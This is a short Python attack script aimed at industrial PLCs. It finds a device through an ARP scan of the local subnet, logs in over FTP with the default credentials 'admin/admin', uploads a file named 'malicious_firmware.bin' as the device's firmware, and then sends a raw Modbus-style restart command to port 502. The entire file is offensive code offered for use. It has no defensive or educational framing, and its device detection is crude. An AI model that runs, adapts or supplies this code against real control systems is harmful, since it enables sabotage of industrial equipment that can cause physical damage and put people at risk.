import os
import socket
import scapy.all as scapy
import ftplib
import time

# Function to scan network and find PLC IP
def find_plc_ip(subnet="192.168.1.1/24"):
    print("[*] Scanning for PLC on network...")
    arp_request = scapy.ARP(pdst=subnet)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        print(f"[+] Possible PLC Detected: {element[1].psrc}")
        return element[1].psrc  # Returns first found IP (Modify for more accuracy)

    print("[-] No PLC found on the network!")
    return None

# Function to exploit firmware update via FTP (example method)
def exploit_firmware_update(plc_ip):
    ftp_username = "admin"  # Default or known PLC credentials
    ftp_password = "admin"
    firmware_file = "malicious_firmware.bin"

    print(f"[*] Connecting to PLC at {plc_ip} via FTP...")
    
    try:
        ftp = ftplib.FTP(plc_ip)
        ftp.login(ftp_username, ftp_password)

        print(f"[+] Connected! Uploading malicious firmware: {firmware_file}...")
        
        with open(firmware_file, "rb") as file:
            ftp.storbinary(f"STOR firmware.bin", file)
        
        print("[+] Firmware update successfully sent. Restarting PLC...")
        
        ftp.quit()

        # Send restart command (if PLC requires restart to apply new firmware)
        send_restart_command(plc_ip)

    except Exception as e:
        print(f"[-] Exploitation failed: {str(e)}")

# Function to send restart/reset command to PLC
def send_restart_command(plc_ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, 502))  # Example Modbus TCP port (modify if needed)
        restart_command = b"\x01\x06\x00\x00\x00\x01\x49\xDB"  # Example Modbus command
        sock.send(restart_command)
        print("[+] Restart command sent to PLC!")
        sock.close()
    except Exception as e:
        print(f"[-] Failed to restart PLC: {str(e)}")

if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        print(f"[+] PLC found at {plc_ip}. Proceeding with firmware exploitation...")
        exploit_firmware_update(plc_ip)
    else:
        print("[-] No PLC detected, exiting...")